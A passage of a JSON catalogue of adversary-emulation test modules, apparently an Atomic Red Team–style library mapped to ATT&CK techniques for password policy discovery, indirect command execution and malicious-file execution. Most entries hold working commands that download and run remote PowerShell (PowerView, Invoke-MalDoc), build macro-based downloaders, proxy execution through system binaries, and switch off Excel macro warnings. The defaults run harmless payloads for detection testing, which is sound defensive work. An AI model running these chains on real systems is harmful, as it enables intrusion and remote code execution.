      "index": 919,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "Lists the password policy to console on macOS.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "pwpolicy getaccountpolicies",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4b7fa042-9482-45e1-b348-4b756b2a0742",
      "module_name": "Examine password policy - macOS"
    },
    {
      "index": 920,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3177f4da-3d4b-4592-8bdc-aa23d0b2e843",
      "module_name": "Get-DomainPolicy with PowerView"
    },
    {
      "index": 921,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "The following RAGLOX test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "get-addefaultdomainpasswordpolicy\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b2698b33-984c-4a1c-93bb-e4ba72a0babb",
      "module_name": "Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy"
    },
    {
      "index": 922,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "SecEdit.exe can be used to export the current local security policy applied to a host.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "510cc97f-56ac-4cd3-a198-d3218c23d889",
      "module_name": "Use of SecEdit.exe to export the local security policy (including the password policy)"
    },
    {
      "index": 923,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "This RAGLOX module will display details about the password policy for the current AWS account.\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "aws iam get-account-password-policy\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
        }
      ],
      "rx_module_id": "15330820-d405-450b-bd08-16b5be5be9f4",
      "module_name": "Examine AWS Password Policy"
    },
    {
      "index": 924,
      "technique_id": "T1202",
      "technique_name": "Indirect Command Execution",
      "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "pcalua.exe -a #{process}\npcalua.exe -a #{payload_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "payload_path",
          "description": "Path to payload",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        },
        {
          "name": "process",
          "description": "Process to execute",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cecfea7a-5f03-4cdd-8bc8-6f7c22862440",
      "module_name": "Indirect Command Execution - pcalua.exe"
    },
    {
      "index": 925,
      "technique_id": "T1202",
      "technique_name": "Indirect Command Execution",
      "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c #{process}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "process",
          "description": "Process to execute",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8b34a448-40d9-4fc3-a8c8-4bb286faf7dc",
      "module_name": "Indirect Command Execution - forfiles.exe"
    },
    {
      "index": 926,
      "technique_id": "T1202",
      "technique_name": "Indirect Command Execution",
      "description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "conhost.exe \"#{process}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "process",
          "description": "Process to execute",
          "type": "string",
          "default_value": "notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cf3391e0-b482-4b02-87fc-ca8362269b29",
      "module_name": "Indirect Command Execution - conhost.exe"
    },
    {
      "index": 927,
      "technique_id": "T1202",
      "technique_name": "Indirect Command Execution",
      "description": "The \"ScriptRunner.exe\" binary can be abused to proxy execution through it and bypass possible whitelisting. Upon test execution, calc.exe should open\nReference: https://x.com/NickTyrer/status/914234924655312896",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Scriptrunner.exe -appvscript \"#{payload_path}\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "payload_path",
          "description": "Path to the executable",
          "type": "String",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0fd14730-6226-4f5e-8d67-43c65f1be940",
      "module_name": "Indirect Command Execution - Scriptrunner.exe"
    },
    {
      "index": 928,
      "technique_id": "T1202",
      "technique_name": "Indirect Command Execution",
      "description": "Simulates execution of commands via the Windows Run dialog (Win+R) by programmatically opening the Run dialog, \ncopying a command to clipboard, and automating the paste and execution. This generates artifacts in the RunMRU registry key,\nwhich is commonly abused by threat actors to execute malicious commands disguised as CAPTCHA verification steps.\nUpon execution, a test PowerShell command will be executed through the Run dialog.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Copy command to clipboard\nSet-Clipboard -Value '#{command}'\n\n# Open Run dialog\nStart-Process -FilePath \"powershell\" -ArgumentList \"-c (New-Object -ComObject 'Shell.Application').FileRun()\" -WindowStyle Hidden\n\n# Wait for Run dialog to open\nStart-Sleep -Seconds 1\n\n# Paste command and execute\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.SendKeys]::SendWait('^v')\nStart-Sleep -Milliseconds 500\n[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command",
          "description": "Command to execute via Run dialog",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "de323a93-2f18-4bd5-ba60-d6fca6aeff76",
      "module_name": "Indirect Command Execution - RunMRU Dialog"
    },
    {
      "index": 929,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-raglox/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{jse_path} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "jse_path",
          "description": "Path for the macro to write out the \"malicious\" .jse file\n",
          "type": "string",
          "default_value": "C:\\Users\\Public\\art.jse"
        },
        {
          "name": "ms_product",
          "description": "Maldoc application Word or Excel",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "8bebc690-18c7-4549-bc98-210f7019efff",
      "module_name": "OSTap Style Macro Execution"
    },
    {
      "index": 930,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "Uses cscript //E:jscript to download a file\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n",
        "elevation_required": false,
        "cleanup_command": "del #{script_file} /F /Q >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "script_file",
          "description": "File to execute jscript code from",
          "type": "path",
          "default_value": "%TEMP%\\OSTapGet.js"
        },
        {
          "name": "file_url",
          "description": "URL to retrieve file from",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3f3af983-118a-4fa1-85d3-ba4daa739d80",
      "module_name": "OSTap Payload Download"
    },
    {
      "index": 931,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-raglox/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ms_product",
          "description": "Maldoc application Word or Excel",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "0330a5d2-a45a-4272-a9ee-e364411c4b18",
      "module_name": "Maldoc choice flags command execution"
    },
    {
      "index": 932,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-raglox/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "jse_path",
          "description": "jse file to execute with wscript",
          "type": "path",
          "default_value": "C:\\Users\\Public\\art.jse"
        },
        {
          "name": "ms_product",
          "description": "Maldoc application Word or Excel",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "add560ef-20d6-4011-a937-2c340f930911",
      "module_name": "OSTAP JS version"
    },
    {
      "index": 933,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{bat_path} -ErrorAction Ignore\nGet-Process | Where-Object { $_.MainModule.FileName -like \"*calculator*\" } | Stop-Process\n"
      },
      "variables": [
        {
          "name": "bat_path",
          "description": "Path to malicious .bat file",
          "type": "string",
          "default_value": "$(\"$env:temp\\art1204.bat\")"
        },
        {
          "name": "ms_product",
          "description": "Maldoc application Word or Excel",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "9215ea92-1ded-41b7-9cd6-79f9a78397aa",
      "module_name": "Office launching .bat file from AppData"
    },
    {
      "index": 934,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$fname = \"$env:TEMP\\raglox_redteam_x4m_exec.vbs\"\n$fname1 = \"$env:TEMP\\procexp.exe\"\nif (Test-Path $fname) {\n  Remove-Item $fname\n  Remove-Item $fname1\n}\n\n$xlApp = New-Object -COMObject \"Excel.Application\"\n$xlApp.Visible = $True\n$xlApp.DisplayAlerts = $False\n$xlBook = $xlApp.Workbooks.Add()\n$sheet = $xlBook.Excel4MacroSheets.Add()\n\nif (\"#{uname}\" -ne \"\") {\n  $sheet.Cells.Item(1,1) = \"#{uname}\"\n} else {\n  $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\n}\n\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\n$sheet.Cells.Item(3,1) = \"raglox_redteam_x4m_exec.vbs\"\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"#{download_url}`\"`\"`\")\"\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"\n$sheet.Cells.Item(23,1) = \"=HALT()\"\n$sheet.Cells.Item(1,1).Name = \"runme\"\n$xlApp.Run(\"runme\")\n$xlApp.Quit()\n\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\n[System.GC]::Collect()\n[System.GC]::WaitForPendingFinalizers()\n\nRemove-Variable xlBook\nRemove-Variable xlApp\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name \"procexp*\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\raglox_redteam_x4m_exec.vbs\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\procexp.exe\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "download_url",
          "description": "Download URL",
          "type": "string",
          "default_value": "https://live.sysinternals.com/procexp.exe"
        },
        {
          "name": "uname",
          "description": "Username for pathing",
          "type": "string",
          "default_value": "$env:Username"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft Excel must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "4ea1fc97-8a46-4b4e-ba48-af43d2a98052",
      "module_name": "Excel 4 Macro"
    },
    {
      "index": 935,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToRagloxModulesFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -name mshta\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Word must be installed\n",
          "check_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
        },
        {
          "description": "Google Chrome must be installed\n",
          "check_command": "try {\n  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe').'(Default)').VersionInfo.FileName\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Google Chrome manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "a19ee671-ed98-4e9d-b19c-d1954a51585a",
      "module_name": "Headless Chrome code execution via VBA"
    },
    {
      "index": 936,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n& \"#{pua_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -name PotentiallyUnwanted\nRemove-Item #{pua_file} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "pua_url",
          "description": "url to PotentiallyUnwanted.exe",
          "type": "url",
          "default_value": "http://amtso.eicar.org/PotentiallyUnwanted.exe"
        },
        {
          "name": "pua_file",
          "description": "path to PotentiallyUnwanted.exe",
          "type": "path",
          "default_value": "$env:TEMP/PotentiallyUnwanted.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "02f35d62-9fdc-4a97-b899-a5d9a876d295",
      "module_name": "Potentially Unwanted Applications (PUA)"
    },
    {
      "index": 937,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macroCode = Get-Content \"#{macro_path}\" -Raw\n$URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"\n$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"\nInvoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"C:\\Users\\$env:username\\Desktop\\#{file_name}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "macro_path",
          "description": "Location of file which will be converted to a VBA macro\n",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1204.002/src/test9-GenericPayloadDownload.txt"
        },
        {
          "name": "c2_domain",
          "description": "This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.\n",
          "type": "url",
          "default_value": null
        },
        {
          "name": "c2_parent_directory",
          "description": "Parent directory where you have the \"malicious\" file on c2_domain server.\nWill default to root directory. Forward slashes are not needed at begining or ending of directory path\n",
          "type": "path",
          "default_value": ""
        },
        {
          "name": "file_name",
          "description": "\"Malicious\" file to be downloaded.\nThis required file needs to be place on the user provided c2 domain\nExample file can be found at PathToRagloxModulesFolder/T1204.002/src/test9-example-payload.txt\n",
          "type": "string",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/test9-example-payload.txt"
        },
        {
          "name": "ms_product",
          "description": "Maldoc application Word or Excel\n",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Destination c2_domain name or IP address must be set to a running HTTP server.\n",
          "check_command": "if (#{c2_domain}) (exit 0) else (exit 1)\n",
          "install_command": "Write-Host \"Destination c2 server domain name or IP address must be set and reachable for HTTP service\"\n"
        },
        {
          "description": "Microsoftt #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "5202ee05-c420-4148-bf5e-fd7f7d24850c",
      "module_name": "Office Generic Payload Download"
    },
    {
      "index": 938,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F\n",
        "elevation_required": false,
        "cleanup_command": "$file1 = \"$env:Temp\\test10.lnk\"\n$file2 = \"$env:Temp\\a.exe\"\nRemove-Item $file1 -ErrorAction Ignore\nRemove-Item $file2 -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "581d7521-9c4b-420e-9695-2aec5241167f",
      "module_name": "LNK Payload Download"
    },
    {
      "index": 939,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed.\nRequires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null\n& '.\\Excel 2016.lnk' \"PathToRagloxModulesFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\"",
        "elevation_required": false,
